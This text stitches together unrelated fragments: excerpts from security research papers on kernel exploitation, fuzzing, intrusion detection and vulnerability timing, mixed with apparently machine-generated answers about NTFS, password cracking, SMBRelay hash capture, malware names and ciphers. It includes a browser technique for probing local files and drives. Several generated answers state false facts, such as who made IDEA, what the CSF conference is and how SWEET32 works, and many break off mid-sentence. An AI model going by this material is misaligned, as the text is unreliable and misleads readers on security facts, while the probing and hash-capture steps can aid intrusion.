In this experiment, the ob jects can be refilled with message  objects in average 1.8 attempts. So our theory is effective to  refill the objects which are freed in slow paths, and the use- after-free vulnerabilities in large size caches like 1024 are  easier to exploit.  V. MITIGATION   On the whole, the essence of use-after-free vulnerability is  that an object with references is freed by mistake. We  proposed a novel about this pr oblem that the system can  manage the objects with zero usage by a priority queue of  waiting time. The time of every  object is determined by two  reasons. One is based on the frequency that the object was  visited in history, an object should be recycle preferentially if  it\u2019s less visited. This is effective to prevent attackers to exploit  the use-after-free vulnerability, becau se the object that  attackers select will be visited frequently and the object will  has a long waiting time. Another reason considers the heap  memory of the system, if there is little space in the system,  then the waiting time shou ld be less. Based on these two  reasons, we balance the efficient and security of system.  Actually, this mitigation of waiting time queue can detect  the use-after-free vulnerab ility. If there is object being visited in the queue, then it\u2019s obvious a use-after-free vulnerability of  this object.  VI.

We expose a fundamental design weakness in the memory management subsystem of Linux by intro- ducing the concept of ret2dir attacks. Our exploita- tion technique bypasses all existing ret2usr pro- tections (SMEP, SMAP, PXN, KERNEXEC, UD- EREF, kGuard) by taking advantage of the kernel\u2019s direct-mapped physical memory region. 2. We introduce a detailed methodology for mount- ing reliable ret2dir attacks against x86, x86-64, AArch32, and AArch64 Linux systems, along with two techniques for forcing user-space exploit pay- loads to \u201cemerge\u201d within the kernel\u2019s direct-mapped RAM area and accurately pinpointing their location. 3.

In 2017, over 14,000 new vulnerabilities were disclosed, so, a key question for administrators is which vulnerabilities to prioritise. The Common Vulnerability Scoring System (CVSS) is often used to decide which vulnerabilities pose the greatest risk and hence inform patching policy. A CVSS score is indicative of a vulnerability severity, but it doesn\u2019t predict the time to exploit for a vulnerability. A prediction of exploit delay would greatly assist vendors in prioritising their patch releases and system administrators in prioritising the installation of these patches. In this paper, we study the effect of CVSS metrics on the time until a proof of concept exploit is developed. We use the National Vulnerability Database (NVD) and the Exploit Database, which represent two of the largest listings of vulnerabilities and exploit data, to show how CVSS metrics can provide better insight into exploit delay. We also investigate the time lag associated with populating CVSS metrics and \ufb01nd that the median delay has increased rapidly from a single day prior to 2017 to 19 days in 2018. This is an alarming trend, given the rapid decline in median vulnerability exploit time from 296 days in 2005 to six days in 2018. I.

We can see that the overhead introduced by OPKH is minimal. In general, these overhead relies on the frequ-ency of the interaction between the kernel module and OS kernel. If the benchmark itself involves lots of interaction, the extra overhead introduced by our protection will be a little bit higher. On the other hand, if the benchmark involves less interaction, the added-on over-head by our system could be negligible. In th-ese application benchmarks, the maximum overhead added by OPKH is 2.25% when we perform the kernel d ecompression. The main  reason is that this benchmark results in the OS kernel interacting with the ext3 file system frequently.  V. R ELATED WORK  5.1 VM-based protection techniques  Basically, these approaches make use of the  hypervisor\u2019s higher privilege over guest VMs  to protect kernel hooks under virtualization environments. Lares [6] exploited the hard- ware-based page-level protection such that  any attempt to write onto the pages, containing kernel hooks, will be trapped into the hyper- visor for security check. Nevertheless, Lares  imposes considerable performance overhead. To address this problem, SIM [7] combines  the CR3_TARGET_LIST feature and memory  virtualization to place the security checkers in the same monitored VM instead of in anotherthe CR3_TARGET_LIST feature and memory  virtualization to place the security checkers in the same monitored VM instead of in another  VM.

In the given context, it is specifically related to high-performance environments and network security.\n\nIn the first reference [26], R. Sommer's Ph.D. dissertation titled \"Viable Network Intrusion Detection in High-Performance Environments,\" the focus is on intrusion detection systems (IDS) that can operate effectively in high-performance computing environments. These environments are characterized by their large processing power, high network traffic, and complex system configurations. The dissertation aims to develop a viable IDS that can handle the specific challenges of such environments, ensuring minimal performance impact while providing adequate security.\n\nThe second reference [27], \"Language Identification of Encrypted VoIP Traffic: Alejandra y Roberto or Alice and Bob?\" by C.

It provides a comprehensive set of recommendations for securing Azure infrastructure based on industry-standard security frameworks, including the Center for Internet Security (CIS) Benchmarks, National Institute of Standards and Technology (NIST) SP 800 series, and Microsoft Security Baselines.\n\nAzure Security Benchmark provides guidance on securing various Azure services, including compute, storage, networking, and applications. It covers a wide range of security controls, including access control, network security, application security, data protection, and incident response.\n\nRegarding the question, the answer is:\n\nA. Azure Firewall Policies\n\nAzure Firewall Policies define the rules that control the traffic flow through Azure Firewall. Azure Firewall uses these policies to configure NAT rules, network rules, and application rules.\n\nAzure Firewall Rules define the specific conditions that must be met for traffic to be allowed or denied. These rules are applied to the Azure Firewall Policies.\n\nAzure Sentinel is a cloud-native security information and event management (SIEM) solution that provides threat intelligence, security analytics, and automated response capabilities for Azure resources.\n\nAzure Firewall Manager is a new service that provides centralized management of Azure Firewall policies across multiple subscriptions and resource groups.\n\nRegarding the fourth question, the answer is:\n\nA. Firewall Policy rules are organized into rule collections, Compute, Storage, NAT, DNAT, Network, and Application groups.\n\nFirewall Policy rules can be organized into different rule collections to help manage\n\n\nIn the context of the provided information, \"Policies\" likely refers to computer security policies or enforcement mechanisms. These policies are rules or guidelines that govern the behavior of computer systems, applications, or users to ensure security and compliance.\n\nThe first reference [24] mentions \"The ultimate CPU emulator,\" Unicorn, which is a popular open-source CPU emulator used for reverse engineering, debugging, and testing. While the paper does not explicitly discuss policies, it's worth noting that emulators can be used to enforce certain policies by controlling the behavior of the emulated system.\n\nThe second reference [25] discusses \"Expression Reduction from Programs in a Symbolic Binary Executor.\" This paper presents a method for symbolically executing binary code and reducing expressions to simplified forms.

This is a security measure designed to protect against brute force password attacks.\n\nBrute force attacks are a type of cyber attack where an attacker systematically checks all possible combinations of a password or passphrase until they find the correct one. Burp Suite Intruder or similar tools can be used to automate this process, making it more efficient for the attacker.\n\nTo mitigate the risk of brute force attacks against BIG-IP APM, the Minimum Authentication Failure Delay and Maximum Authentication Failure Delay options can be enabled. These options set the minimum and maximum time delay between failed authentication attempts.\n\nWhen a user enters an incorrect password, they are typically locked out for a certain period of time before they can try again. By setting a minimum delay between failed attempts, you can make it more difficult for an attacker to use automated tools to quickly cycle through potential passwords.\n\nSimilarly, by setting a maximum delay between failed attempts, you can prevent an attacker from making too many attempts in a short period of time, which could potentially overload the system or trigger other security measures.\n\nThe Configuration utility is the interface used to manage and configure the BIG-IP APM. To enable the Minimum Authentication Failure Delay and Maximum Authentication Failure Delay options, follow these steps:\n\n1. Log in to the BIG-IP system using the Configuration utility.\n2. Navigate to the Access Policy > Self IPs > Self IP Addresses > <Your Self IP Address> > Access Profiles >\n\n\n"}

It is supposed to be protected from any user access because all files that use NTFS have a reference to it. If the directory is recreated, the system will lock the file until the next reboot. Therefore, for example, when trying to create a file or read the volume of files, NTFS attempts to seize ERESOURCE $ MFT file and will hang at this stage forever.\n2.

Similar to AFL, we consider a crash- ing input to be unique if it triggered at least one basic block transition which has not been triggered by any pre- vious crash (i.e., the bitmap contains at least one new bit). Note this does not imply that the underlying bugs are truly unique. 5.1 Fuzzing Windows We implemented a small Windows 10 speci\ufb01c user mode agent that mounts any data chunk (fuzzed payload) as NTFS-partitioned volume (289 lines of C code). We used the Virtual Hard Disk (VHD) API and various IOCTLS to mount and unmount volumes programmat- ically [31, 32]. Unfortunately, mounting volumes is a slow operation under Windows and we only managed to achieve a throughput of 20 executions per second. Nonetheless, kAFL managed to \ufb01nd a crash in the NTFS driver. The fuzzer ran for 4 days and 14 hours and re- ported 59 unique crashes, all of which were division by zero crashes. After manual investigation we suspect that there is only one unique bug. While it does not allow code execution, it is still a denial-of-service vulnerability, as for example, a USB stick with that malicious NTFS volume plugged into a critical system will crash that sys- tem with a blue screen. It seems that we only scratched the surface and NTFS was not thoroughly fuzzed yet. Hence, we assume that the NTFS driver under Windows is a valuable target for coverage-based feedback fuzzing. Furthermore, we implemented a generic system call (syscall) fuzzing agent that simply passes a block of data to a syscall by setting all registers and the top stack re- gion (55 lines of C and 46 lines of assembly code). This allows to set parameters for a syscall with a fuzzing pay- load independent of the OS ABI. The same fuzzer can be used to attack syscalls on different operation sys- tems such as Linux or macOS. However, we evaluated it against the Windows kernel given the proprietary na- ture of this OS. We did not \ufb01nd any bugs in 13 hours of fuzzing with approx 6.3M executions since many\\'\\n\\'the fuzzer as the OS needs to reboot. In this paper, we approach the problem of coverage- guided kernel fuzzing in an OS-independent and hardware-assisted way: We utilize a hypervisor and In- tel\u2019s Processor Trace (PT) technology. This allows us to remain independent of the target OS as we just re- quire a small user space component that interacts with the targeted OS. As a result, our approach introduces almost no performance overhead, even in cases where the OS crashes, and performs up to 17,000 executions per second on an off-the-shelf laptop. We developed a framework called kernel-AFL (kAFL) to assess the secu- rity of Linux, macOS, and Windows kernel components. Among many crashes, we uncovered several \ufb02aws in the ext4 driver for Linux, the HFS andAPFS \ufb01le system of macOS, and the NTFS driver of Windows. 1 Introduction Several vulnerability classes such as memory corrup- tions, race-conditional memory accesses, and use-after-free vulnerabilities, are known threats for programs run- ning in user mode as well as for the operating system (OS) core itself. Past experience has shown that attack- ers typically focus on user mode applications. This is likely because vulnerabilities in user mode programs are notoriously easier and more reliable to exploit. How- ever, with the appearance of different kinds of exploit defense mechanisms \u2013 especially in user mode, it has become much harder nowadays to exploit known vul- nerabilities. Due to those advanced defense mechanisms in user mode, the kernel has become even more appeal- ing to an attacker since most kernel defense mechanisms are not widely deployed in practice. This is due to more complex implementations, which may affect the system performance. Furthermore, some of them are not part of the of\ufb01cial mainline code base or even require sup- port for the latest CPU extension (e.g., SMAP / SMEP on x86-64). Additionally, when compromising the OS, an attacker typically gains full access to the system re-\\'\\n\\'formed while running 8 processes in parallel. 5.5 Detected Vulnerabilities During the evaluation, kAFL found more than a thou- sand unique crashes. We evaluated some manually and found multiple security vulnerabilities in all tested op- erating systems such as Linux, Windows, and macOS. So far, eight bugs were reported and three of them were con\ufb01rmed by the maintainers: \u2022 Linux: keyctl Null Pointer Dereference5(CVE- 2016-86506) \u2022 Linux: ext4 Memory Corruption7 \u2022 Linux: ext4 Error Handling8 \u2022 Windows: NTFS Div-by-Zero9 \u2022 macOS: HFS Div-by-Zero10 \u2022 macOS: HFS Assertion Fail10 \u2022 macOS: HFS Use-After-Free10 \u2022 macOS: APFS Memory Corruption10 Red Hat has assigned a CVE number for the \ufb01rst re- ported security \ufb02aw, which triggers a null pointer def- erence and a partial memory corruption in the kernel ASN.1 parser if an RSA certi\ufb01cate with a zero expo- nent is presented.

The last re- ported Linux vulnerability, which calls in the ext4 error handling routine panicHI and hence results in a kernel panic, was at the time of writing not investigated any fur- ther. The NTFS bug in Windows 10 is a non-recoverable error condition which leads to a blue screen. This bug was reported to Microsoft, but has not been con\ufb01rmed yet. Similarly, Apple has not yet veri\ufb01ed or con\ufb01rmed our reported macOS bugs. 5.6 Fuzzing Performance We compare the overall performance of kAFL across dif- ferent operating systems.

Nevertheless, there were a lot of issues with this dataset. The fact that the KDD dataset contains a significant number of records that are identical to others is, to begin, one of its primary drawbacks. 78% of the records in the training set have been duplicated, and approximately 75% of the total number of records in the testing dataset has been duplicated; as a result, our findings translate to biassed learning methods. The NSL KDD dataset, which now makes use of the dataset for use in machine learning algorithms, is accessible as a public data set for the network intrusion detection system. Even if there may potentially be a new version of the KDD Cup 99 dataset, this dataset is used in the NSL KDD dataset. There is no duplication of data in the new NSL KDD Test and Train dataset, which was created by combining only the most relevant information from the original KDD dataset. As a direct consequence of this, the findings of the research evaluation have been deemed to be a standard dataset that is consistent across all studies. The training dataset is comprised of four distinct kinds of assaults, as a general rule. First is the Denial of Service Attack (DoS), then comes the Probe Attack, then comes what is known as the User to Root Attack (U2R), and last comes the Root to Local Root Attack (R2L). This, in turn, is made up of more than 21 different assaults. V. CONCLUSION As a consequence of this, within this work, we suggest a security system that we refer to as the Internal Intrusion Detection and Protection System (IIDPS). This system is capable of identifying hostile behaviour that is aimed towards a system at the SC level. The IIDPS mines system call patterns, also known as SC-patterns,\\'\\n\\'$target$ = \\\\\\\\\\\\\\\\\\\\\\\\localhost\\\\\\\\windows\\\\\\\\  $target$ = \\\\\\\\\\\\\\\\\\\\\\\\localhost\\\\\\\\invalidfolder\\\\\\\\  Try it in: http://jsfiddle.net/ubqug/6/ - in case of an invalid folder the message will be: \u201cthe system cannot locate the object \u2026\u201d.

I solved this problem by using \u201cres://\u201d protocol (http://msdn.microsoft.com/en-us/library/aa767740(v=vs.85).aspx) and I received different error messages by pointing to the files or folders.  $target$ = res://d:\\\\\\\\validfile.txt  $target$ = res://d:\\\\\\\\invalidfile.txt  See the results here (you need to create the \u201cvalidfile.txt\u201d file in your D drive or change the path): http://jsfiddle.net/ubqug/5/  #### **Detecting available drives:**  In order to make the results more accurate, I had to find the available drive letters on the box. Unfortunately \u201cres://\u201d protocol was not helpful in this case and I had to use another solution. The solution that I found was in fact very easy. I could use the drive letters directly; if the drive letter is available, the error message would be \u201caccess denied\u201d and when it is not available, the error message changes to \u201cthe system cannot find the path specified\u201d:  $target$ = c:\\\\\\\\  $target$ = invalid:\\\\\\\\  See the results in http://jsfiddle.net/ubqug/8/\\'\\n\\'we have covered previously (see \u201cEavesdropping on Network Password Ex-change\u201d earlier in this chapter).Booting to an Alternate OS Booting to an alternate OS is as simple as creating a DOS sys-tem floppy with the copy utility on it.

Hard Links allow a single file to have multiple names or paths within the same NTFS volume. This means that a single file can be accessed using different names or paths, but the data is stored only once on the disk. This feature was most likely added to NTFS for POSIX (Portable Operating System Interface) compatibility, as it is a common feature in Unix-based file systems.\n\nBefore Windows 2000, creating Hard Links in NTFS was an undocumented and unsupported feature. However, with the release of Windows 2000, Microsoft introduced the CreateHardlink API, which allowed developers to create Hard Links in an official and supported way from Windows applications. This API provided a way to create Hard Links using the CreateFile function with the FILE_FLAG_REOPEN_LINK flag.\n\nHard Links have several advantages over other methods of creating multiple names for a file, such as symbolic links or junction points. Hard Links do not require any additional disk space, as they only reference the existing file data. They also maintain the same security permissions and file timestamps for all the Hard Links, making them an ideal solution for scenarios where multiple users need to access the same data using different names or paths.\n\n\n NTFS, or New Technology File System, is a file system developed by Microsoft for use in its Windows operating systems. It was introduced in 1993 as a replacement for the older File Allocation Table (FAT) file system. NTFS offers several advanced features, such as journaling, file-level security, and support for large file sizes and volumes.\n\nIn the context of the information provided, the Rovnix malware is a type of malware that was first detected in 2011 and is identified as a Carberp variant. Rovnix infects the NTFS Volume Boot Record (VBR) to achieve persistence. The VBR is a critical component of the NTFS file system, as it contains the code that is executed when a computer is started. By infecting the VBR, Rovnix ensures that its malicious code is executed every time the computer starts up.\n\nWhen a computer is started, the BIOS (Basic Input/Output System) hands control over to the MBR (Master Boot Record), which in turn hands control over to the VBR. The VBR contains the code necessary to load the operating system and any necessary device drivers. In the case of an NTFS-formatted hard drive, the VBR also contains the code to initialize the NTFS file system.\n\nRovnix compresses the original VBR code and writes its own bootkit to the VBR.

Architecture of test environment The test system was installed in two locations, on a sepa- rated network at the university available via Wi-Fi connection, and on a cloud-based system to make it reachable from home. An additional benefit of the cloud-based system is that we were able to track and analyze attacks from automated bots running continuously on the Internet. To identify the attackers we created a CTFd page, where participants could validate the found flags. This was especially useful to link source addresses to attackers, by this we could analyze specific attacks separately. IV. E VALUATION OF RESULTS Data analysis was performed using mainly the Kibana com- ponent of the ELK stack, which is responsible for visualizing the log data entering this log management system. We created dashboards on this interface, in which we embedded visual panels based on the correlation of the log entries. During the examination we also used custom queries to filter the large amount of records. This was due to the fact that the ELK Stack during the processing breaks down the entries into separatefields with comparable data, increasing the searchability of the data set. The CTF competition, which provided the basis for testing, was attended by 25 students who tried to get the flags for two weeks. During this time, we were able to detect about 5 million request releted to them and the analysis found that they tried to break the system for an average 3 and a half hours. During the competition, a total of 7 participants managed to find and solve all three challenges. In the first round, we examined the time factor.

It was originally developed by a group of hackers known as the L0pht Team in the late 1990s. The tool gained notoriety due to its effectiveness in cracking Windows NT and 2000 domain passwords.\n\nOne of the methods used by L0phtCrack to recover passwords is through the use of a tool called SMBRelay. SMBRelay is a component of the L0phtCrack suite that is designed to capture NTLM password hashes from a network. NTLM (NT LanManager) is a protocol used for authentication and session establishment in Windows networks.\n\nThe process of using SMBRelay to capture password hashes involves the following steps:\n\n1. SMBRelay is run on a target system or on a system that has access to the target network.\n2. SMBRelay listens for incoming NetBIOS sessions on port 139, which is required for NetBIOS communication.\n3. When a client attempts to establish a NetBIOS session with the system running SMBRelay, the tool intercepts the NTLM authentication traffic.\n4. SMBRelay captures the NTLM password hashes and writes them to a file named \"hashes.txt\" in a format that is usable by L0phtCrack for cracking at a later time.\n5. The attacker can then use L0phtCrack to crack the captured password hashes and gain access to the target systems.\n\nSince port 139 is a privileged port and\n\n\n RainbowTables is a type of pre-computed password dictionary used in password cracking. It is called a \"rainbow table\" because of the way the data is organized in the table, which is in the form of a series of colorful hash value representations. RainbowTables are created by pre-computing hash values for all possible combinations of passwords within a certain length range. When used for password cracking, the attacker computes the hash value of the known encrypted data and compares it to the hash values in the RainbowTable. If there is a match, the corresponding password is the likely candidate for the original password.\n\nIn the context of your question, when you mention \"crack the first 7 characters using RainbowTables,\" it means that you are using a RainbowTable to find the possible passwords for the first 7 characters of an encrypted password. The RainbowTable would contain hash values for all possible combinations of 7-character passwords, and you would compare the hash value of the encrypted data for the first 7 characters to the hash values in the RainbowTable to find a match. Once a match is found, the corresponding 7-character password is the likely candidate for the original password for the first 7 characters.\n\n**Cracking the second 7 characters using john the ripper\u2019s netntlm.pl script**\n\nJohn the Ripper is a popular password cracking tool that supports multiple password hash types, including the NT hash type used in Windows systems. The netntlm.pl script is a component of John the Ripper that is specifically designed for cracking NT hash values.\n\nWhen you mention \"crack the second 7 characters using john the ripper\u2019s netntlm.pl script,\" it means that you are using the netntlm.pl script from John the Ripper to find the possible passwords for the second 7 characters of an encrypted password\n\n\n In the context of the provided information, \"Crack\" refers to a password cracking tool or software. It is a utility used to guess or discover passwords by trying various combinations of characters. The tool is particularly useful when attempting to gain unauthorized access to secured systems or files, such as the \"administrators.pwd\" and \"authors.pwd\" files mentioned in the text.\n\nThese files are located in the \"_vti_pvt\" directory of a Frontpage-enabled website. Frontpage is a web development tool that allows users to create and manage websites without requiring extensive knowledge of HTML or other web technologies. The \"_vti_pvt\" directory is a hidden directory in the website's file structure, which contains various files related to the website's administration and security.\n\nThe \"administrators.pwd\" and \"authors.pwd\" files store the passwords used to access the website's administrative functions. By obtaining these files and converting them properly, users can then employ password cracking tools like Crack to reveal the passwords contained within. This information can be used for malicious purposes, such as defacing websites, unauthorized access, or other forms of cyberattacks.\n\nIt is essential to note that accessing and using this information for unauthorized purposes is illegal and unethical. It is crucial to respect the security and privacy of websites and their owners. Instead, it is recommended to use this knowledge to improve website security and protect against potential attacks.\n\n\n Ripper is a well-known password cracking tool used in penetration testing, cybersecurity, and ethical hacking. It is designed to recover weak passwords by using dictionary, brute force, and hybrid attacks on various types of encrypted password files such as LanMan crypt, NT hash, and Unix crypt.\n\nThe tool's name, Ripper, is derived from its ability to \"rip\" or extract clear-text passwords from encrypted password files. Once Ripper has cracked the passwords, it can output them in clear text format, making it easier for users to access the protected systems or data.\n\nRipper supports multiple attack methods, including:\n\n1. Dictionary attacks: This method uses a predefined list of words, phrases, or common passwords to attempt to crack the password.\n2. Brute force attacks: This method uses a systematic approach to try all possible combinations of characters until the correct password is found.\n3. Hybrid attacks: This method combines dictionary and brute force attacks to increase the chances of finding the correct password.\n\nRipper is an open-source tool and is available for various operating systems, including Windows, Linux, and macOS. It is important to note that using Ripper or any other password cracking tool without proper authorization is illegal and unethical. It is recommended to use such tools only for legitimate purposes, such as testing the security of your own systems or with the explicit permission of the system owner.\n\n\n Rainbow Crackalack is a project or initiative under the umbrella of Positron Security, a cybersecurity firm that specializes in various security services and solutions. The name \"Rainbow Crackalack\" is likely a creative alias or branding for a specific aspect of Positron Security's work, possibly related to their penetration testing and research activities.\n\nThe first mention of Rainbow Crackalack in the provided context is in relation to the release of NTLM 9-character Rainbow Tables. Rainbow Tables are precomputed tables used in password cracking, specifically for cracking LM hash passwords. The NTLM (NT LanManager) protocol is an authentication protocol used in older Microsoft Windows systems. By releasing NTLM 9-character Rainbow Tables, Rainbow Crackalack is providing a valuable resource for security professionals and researchers to test and improve the security of systems that still use this outdated authentication method.\n\nThe second mention of Rainbow Crackalack in the context is in relation to the \"GOG Galaxy Client Local Privilege Escalation Deuce\" vulnerability. GOG Galaxy is a digital distribution platform and multiplayer service developed by GOG.com. The \"Local Privilege Escalation Deuce\" vulnerability refers to a security issue that allows an attacker to gain elevated privileges on a system by exploiting a vulnerability in the GOG Galaxy Client.

The DES algorithm uses a 56-bit key and a 64-bit block size.\n\nCVE-2016-2183 is a vulnerability that affects OpenSSL, an open-source implementation of the SSL/TLS protocol. The vulnerability is related to the use of the DES and 3DES (Triple DES) cipher in OpenSSL.\n\nThe vulnerability arises from an error in the implementation of the DES/3DES cipher in OpenSSL. Specifically, it was discovered that an attacker who can conduct a man-in-the-middle (MitM) attack on the SSL/TLS communication between a server and a client can exploit this vulnerability to recover the plaintext data and obtain sensitive information.\n\nThe attack works by the attacker capturing large amounts of encrypted traffic between the SSL/TLS server and the client. The attacker then uses a technique called \"Sweet16\" or \"SWEET32\" to recover the 32-bit keys used in the DES/3DES cipher. These keys are derived from the initial vector (IV) and the first 768 bits of the encrypted data.\n\nThe Sweet16/SWEET32 attack is possible due to a weakness in the DES/3DES c\n\n\n CSF, or IEEE Symposium on Security and Privacy, is a premier international conference in the field of computer security. The conference provides a forum for researchers, practitioners, and engineers to present and discuss the latest research findings, innovations, and developments in all areas of computer security. The conference covers a wide range of topics, including but not limited to, network security, cryptography, application security, security management, and security engineering.\n\nThe paper titled \"Secure Compilation of Side-Channel Countermeasures: The Case of Cryptographic 'Constant-Time'\" by Barthe, Gregoire, and Laporte, was presented at the CSF conference in 2018. The authors in this paper focus on the area of side-channel attacks and countermeasures.\n\nSide-channel attacks are a type of security attack that targets the implementation of cryptographic algorithms rather than the algorithms themselves. These attacks exploit the side-channel information leakage, such as power consumption, electromagnetic radiation, or acoustic signals, to extract sensitive information.\n\nThe authors in this paper propose a method for securely compiling side-channel countermeasures for cryptographic constant-time implementations. Constant-time implementations are designed to be resilient against side-channel attacks by ensuring that the execution time of each instruction is constant, regardless of the input data. However, these implementations can still leak information through other channels, such as cache behavior or memory access patterns.\n\nThe authors propose a method for securely compiling side-channel countermeasures using a combination of static and dynamic analysis techniques. They use the Coq proof assistant to formally verify the security of their countermeasures against various side-channel attacks. The authors also present a case study of their approach applied to the AES encryption algorithm.\n\nIn summary, CSF is a leading computer security conference, and the paper by Barthe, Gregoire, and Laporte presents\n\n\n International Data Encryption Algorithm (IDEA) is a symmetric-key block cipher encryption algorithm that was developed by Xor Data Security in 1990. IDEA is an improvement over the DES algorithm, which was the standard encryption algorithm before IDEA. IDEA was designed to address some of the weaknesses of DES, such as its 56-bit key length and its susceptibility to certain types of attacks.\n\nIDEA uses a 128-bit key and a 64-bit block size. It employs a complex encryption process that involves the use of 16 different round functions, each of which includes a combination of bitwise operations, additions, and multiplications. The encryption process is designed to make it difficult for attackers to decipher the encrypted data without the correct key.\n\nIDEA was widely used in various applications, including secure communications protocols, such as the Internet Engineering Task Force (IETF) Data Security Working Group's DTLS (Datagram Transport Layer Security) protocol. However, due to security concerns and the availability of more secure encryption algorithms, such as Advanced Encryption Standard (AES), IDEA has been largely replaced in modern cryptographic applications.\n\nIn the context of the provided information, RFC6460, RFC4744, and RFC4743 are documents related to the DTLS protocol. These documents have been marked as historic, which means that they are no longer in use and have been replaced by more modern versions of the protocol.

The project's primary goal was to develop and enhance the security of information systems, specifically focusing on the protection against memory errors and other vulnerabilities.\n\nThe quote provided in the text suggests that the researchers involved in the project have identified the significance of sigreturn-oriented programming (SROP) as a powerful addition to an attacker's arsenal. Sigreturn-oriented programming is a technique used in exploiting memory errors, particularly stack-based buffer overflows.\n\nIn the context of backdoors, the usefulness of sigreturn-oriented programming lies in its ability to create more sophisticated and persistent attacks. By chaining multiple function calls using sigreturn, an attacker can manipulate the system's control flow to execute arbitrary code, bypass security mechanisms, and maintain a persistent presence on the compromised system.\n\nThe researchers in the SYSSEC project acknowledged the contributions of anonymous reviewers and the financial support from the European Research Council's StG project \"Rosetta\" and the EU FP7 SYSSEC project.

INTRODUCTION   The IDS (Intrusion Detection System) is a defense  against attacks attempting to steal information stored on  various platforms such as servers and personal computers .  In the case of widely known attacks, it is easy for the  administrator to judge and proces s it immediately, but it is  unclear to judge unknown abnormal data, and the cost of  restoration increases as the handling is delayed [8 ].  Machine Learning techniques  are widely used in IDS  due to  its ability to classify normal/attack network packets  by learning patterns based on the collected data . There are  many results for classification of normal/attack,  however,  there is little work on classifying different attack  types.   Therefor e, an IDS that can detect a particular attack type  may not be able to respond properly to arracks that are  developing in various forms. The purpose of classifying\\'\\n\\'search direction.

Note, however, that it \u201cfuses\u201d the chained string copy invocations. When we compile with a higher optimization level such as O2 and then decompile the \ufb01le, we see the result in Fig. 2c. The per- formance of the decompiler degrades, as the binary gets more optimized: some library function uses are no longer recovered. In the \ufb01gure, we highlight the parts of the func- tion relating to the library function calls, whose implementa- tion has been inlined. In this example, we do see that three other function calls are recovered, however, this could be due to the fact that they were never inlined or that Ghidra does a good job of recovering them even if they were inlined. We want to clarify that like [28], [29], [30], [31] we do not target the function boundary identi\ufb01cation task. Ghidra & Hexrays already do this at 90 percent+ accuracy. They do much worse at the recovery of inlined library functions; This task is a challenge for the heuristic method used by Ghidra & Hexrays, especially at higher optimization levels, as acknowledged by the developers [2]; by leveraging pow- erful neural models (explained in Section 4), F UNCRE can improve these tools. A decompiler can recover most of the semantics of the original code, however, it has a hard time recovering vari- able names, struct types, exact data \ufb02ow, code comments, and inlined library functions. Most of this information is lost in the compilation - decompilation loop, e.g., in Fig. 2 the decompiler adds a lot of new local variables each with an ambiguous name.State-of-the-art approaches to improving decompilation employ machine learning (ML) techniques.

Among these files, there is a DLL file named \"Virus.Win32.Hawey\" with a size of 5.5 KB.\n\nHawey is a type of malware, specifically a DLL (Dynamic Link Library) file. DLL files are a type of executable file that contains reusable code, data, or both that can be used by other programs. In the context of the provided information, Hawey is a malicious DLL file that has been identified by antivirus software with the name \"Virus.Win32.Hawey.\"\n\nThe file size of Hawey is 5.5 KB, which is relatively small compared to some other malware. However, the size of a malware file does not necessarily indicate the level of harm it can cause. Malware can be designed to be very destructive or stealthy, regardless of its size.\n\nThe fact that the file size of Hawey changed after it damaged the original file suggests that it may be a type of malware that modifies other files in order to infect them or cause harm.

The files in question are DLL (Dynamic Link Library) files and EXE (Executable) files. Here's a detailed description of each malware component:\n\n1. 4Virus.Win32.Orez.6291 and 5Virus.Win32.Orez.6287: These are identified as DLL files with a size of 12.0 KB each. The \"Orez\" identifier suggests that they might be part of the same malware family or variant.\n\n2. 6Virus.Multi.b: This is identified as a DLL file with a size of 68 KB. The \"Multi\" identifier suggests that it might be a more complex or versatile malware component.\n\n3. 7Virus.DOS.Vienna.Violator.699: This is identified as an EXE file with a size of 1.4 KB. The \"DOS\" identifier suggests that it might be a DOS (Disk Operating System) malware.\n\n4. 8Virus.BAT.Batman.\n\n\n Based on the provided information, it appears that we have a list of files with their respective names, versions, sizes, timestamps, and architecture (x64). However, there is no clear indication of what \"Chksgfiles\" is or represents in this context.\n\nThe first entry in the list is \"Chksgfiles.dll\" with a version number of 15.1.2375.17, size of 57,232 bytes, and a timestamp of 3-Nov-21 18:25.

Stopdagservermaintenance.ps1 - A PowerShell script with an unknown version number, size of 21\n\n\n Based on the information provided, it appears that there are several malicious files with various virus signatures, including DLL and EXE files. Among these files, there are two Batman-related files: an EXE file with the name \"Virus.BAT.Batman.b\" and a DLL file with an unknown name.\n\nBatman, in this context, is likely a reference to a specific malware or virus family, and the files labeled \"Virus.BAT.Batman.b\" and \"Virus.Win32.Hawey\" are suspected to be part of this family.\n\nBatman malware is a type of malicious software that can take various forms, including viruses, worms, and Trojans. It is known for its ability to spread through removable media, such as USB drives, and can infect both Windows and Linux operating systems. Once infected, the malware can perform various malicious activities, such as stealing sensitive information, installing additional malware, or causing system damage.\n\nThe size of the Batman-related files in the table suggests that they are relatively small in size, with the EXE file being only 256 bytes and the DLL file having an unknown size but being smaller than\n\n\n"}

Its dynamically loaded packet capture driver is named fsniff.sys.", "context": "Infos:\n(\"'works (CDNs). Unfortunately, setting lower TTL values and using Round-Robin DNS is useful for the attackers as well. Us- ing this approach, malicious systems achieve higher avail- ability and become more resistant against DNS blacklist- ing (DNSBL) [5] and take downs. For example, Fast-Flux Service Networks (FFSN) [36] are malicious systems that abuse Round-Robin DNS. Most techniques to detect FFSNs are based on analyzing abnormal usage patterns of Round-Robin DNS. More pre- cisely, to label a domain as being a member of an FFSN, previous research [30, 36] expects to observe a low TTL usage combined with a constantly growing DNS answers list (i.e., distinct IP addresses). We extracted \ufb01ve features from the TTL value included in the DNS answers (see Table 1). The average TTL usage feature (Feature 9) was introduced in previous re- search [30]. The rest of the features (i.e., Features 10, 11, 12, 13) have not been used before in previous work. During our experiments with large volumes of DNS traf- \ufb01c, we observed that frequent TTL changes are exhibited by malicious networks that have a sophisticated infrastructure. In such networks, some of the bots are selected to be prox-ies behind which other services (e.g., command and control servers) can be hidden. The managers of such malicious networks assign different levels of priorities to the proxy bots by setting lower TTL values to the hosts that are less reliable. For example, there is a good chance that a proxy running on an ADSL line would be less reliable than a proxy running on a server running in a university environment. To determine the validity of our assumption about this type of TTL behavior, we tracked the Con\ufb01cker domains for one week. We observed that different TTL values were returned for the IPs associated with the Con\ufb01cker domains. While the static IP addresses have higher TTL values, the dynamic IP addresses, that are most probably assigned to home computers by Internet service providers, have lower'\\n'Home agents (HA), A-HA and B-HA, are the gateways in a mobile node\u2019shome network (HN) where the mobile node registers its permanent IP address.

